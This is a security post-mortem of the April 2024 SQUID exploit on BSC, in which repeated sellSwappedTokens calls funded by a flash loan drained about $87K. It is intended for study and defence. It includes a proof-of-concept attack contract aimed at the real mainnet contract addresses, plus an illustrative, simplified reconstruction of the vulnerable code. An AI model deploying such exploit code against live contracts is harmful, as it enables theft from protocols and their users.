# SQUID — swapTokens + sellSwappedTokens Repeated Sandwich Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | SQUID |
| **Chain** | BSC |
| **Loss** | ~$87,000 |
| **Vulnerable Contract** | [SquidSwap 0xd309f0Fd](https://bscscan.com/address/0xd309f0Fd5C3b90ecFb7024eDe7D329d9582492c5) |
| **SQUID_1 Token** | [0x87230146](https://bscscan.com/address/0x87230146E138d3F296a9a77e497A2A83012e9Bc5) |
| **SQUID_2 Token** | [0xFAfb7581](https://bscscan.com/address/0xFAfb7581a65A1f554616Bf780fC8a8aCd2Ab8c9b) |
| **Root Cause** | After swapping SQUID_1→SQUID_2 via `SquidSwap.swapTokens()`, repeatedly calling `sellSwappedTokens()` ~8,000 times distorts internal price calculations, causing excessive WBNB payouts |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SQUID_exp.sol) |

---

## 1. Vulnerability Overview

The `sellSwappedTokens()` function of the SquidSwap contract calculates WBNB payouts based on internal state. Repeatedly calling this function distorts the internal accumulated state, causing progressively larger WBNB payouts. The attacker borrowed 10,000 WBNB via a V3 flash loan, purchased SQUID_1 and SQUID_2, then called `sellSwappedTokens()` approximately 8,000 times, accumulating profit through 4 cycles of swaps and sells.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: internal state distortion via repeated sellSwappedTokens calls
contract SquidSwap {
    mapping(address => uint256) public swappedBalance;

    function swapTokens(address tokenIn, uint256 amount) external {
        // SQUID_1 → SQUID_2 swap
        swappedBalance[msg.sender] += convertedAmount;
    }

    // No cooldown/repeat prevention — repeated calls possible
    function sellSwappedTokens(uint256 amount) external {
        // WBNB calculation based on swappedBalance — cumulative error occurs
        uint256 wbnbOut = calculateWBNB(swappedBalance[msg.sender], amount);
        swappedBalance[msg.sender] -= amount;
        WBNB.transfer(msg.sender, wbnbOut);
        // ← On repeated calls, calculation error causes wbnbOut overpayment
    }
}

// ✅ Safe code: repeat call prevention + maximum payout validation
mapping(address => uint256) public lastSellBlock;

function sellSwappedTokens(uint256 amount) external {
    require(block.number > lastSellBlock[msg.sender], "one sell per block");
    lastSellBlock[msg.sender] = block.number;
    require(amount <= swappedBalance[msg.sender], "insufficient balance");
    uint256 wbnbOut = calculateWBNB(amount);
    require(wbnbOut <= MAX_SINGLE_SELL, "sell amount too large");
    swappedBalance[msg.sender] -= amount;
    WBNB.transfer(msg.sender, wbnbOut);
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: SQUID_decompiled.sol
contract SQUID {
    function sellSwappedTokens(uint256 p0) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] V3 Pool Flash Loan: borrow 10,000 WBNB
  │
  ├─→ [2] 7,000 WBNB → buy SQUID_1
  │
  ├─→ [3] SquidSwap.swapTokens(SQUID_1, amount) → receive SQUID_2
  │
  ├─→ [4] 3,000 WBNB → buy SQUID_2
  │
  ├─→ [5] sellSwappedTokens() × ~8,000 iterations
  │         └─ Receive WBNB on each call (cumulative state distortion)
  │
  ├─→ [6] Repeat 4 cycles (swap + sell)
  │
  ├─→ [7] Remaining SQUID_2 → reverse swap to WBNB
  │
  ├─→ [8] Repay V3 flash loan
  │
  └─→ [9] ~$87K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ISquidSwap {
    function swapTokens(address tokenIn, uint256 amount) external;
    function sellSwappedTokens(uint256 amount) external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackContract {
    ISquidSwap    constant squid  = ISquidSwap(0xd309f0Fd5C3b90ecFb7024eDe7D329d9582492c5);
    IPancakeV3Pool constant v3Pool = IPancakeV3Pool(/* V3 WBNB pool */);
    IERC20 constant SQUID1 = IERC20(0x87230146E138d3F296a9a77e497A2A83012e9Bc5);
    IERC20 constant SQUID2 = IERC20(0xFAfb7581a65A1f554616Bf780fC8a8aCd2Ab8c9b);
    IERC20 constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        v3Pool.flash(address(this), 0, 10_000e18, "");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        // [1] 7,000 WBNB → buy SQUID_1
        swapWBNBToSQUID1(7_000e18);

        // [2] Swap SQUID_1 → SQUID_2 via SquidSwap
        uint256 s1Bal = SQUID1.balanceOf(address(this));
        SQUID1.approve(address(squid), s1Bal);
        squid.swapTokens(address(SQUID1), s1Bal);

        // [3] 3,000 WBNB → buy SQUID_2
        swapWBNBToSQUID2(3_000e18);

        // [4] Call sellSwappedTokens 8,000 times
        uint256 s2Bal = SQUID2.balanceOf(address(this));
        SQUID2.approve(address(squid), s2Bal);
        for (uint i = 0; i < 8000; i++) {
            squid.sellSwappedTokens(s2Bal / 8000);
        }

        // [5] Remaining SQUID_2 → WBNB
        swapSQUID2ToWBNB(SQUID2.balanceOf(address(this)));

        // [6] Repay flash loan
        WBNB.transfer(address(v3Pool), 10_000e18 + fee1);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Repeated call internal state distortion (logic flaw) |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Attack Vector** | External (flash loan + repeated sellSwappedTokens calls) |
| **DApp Category** | Custom DEX / token swap contract |
| **Impact** | Draining swap contract WBNB reserves (~$87K) |

## 6. Remediation Recommendations

1. **One sell per block limit**: Block re-calls to sellSwappedTokens within the same block
2. **Maximum single sell amount**: Set an upper bound on maximum sell/payout amount per single call
3. **Internal state consistency validation**: Verify `totalSwapped == sum(individualSwapped)` after each call
4. **Checks-Effects-Interactions**: Ensure state updates occur before external transfers

## 7. Lessons Learned

- Repeatable payout functions like `sellSwappedTokens()` are prime targets for overpayment exploits caused by internal cumulative state errors.
- Repeat call defenses must go beyond simple reentrancy guards to also cover multiple calls within the same block.
- Since flash loans enable thousands of function calls within a single transaction, repeat call cost analysis is an essential component of security design.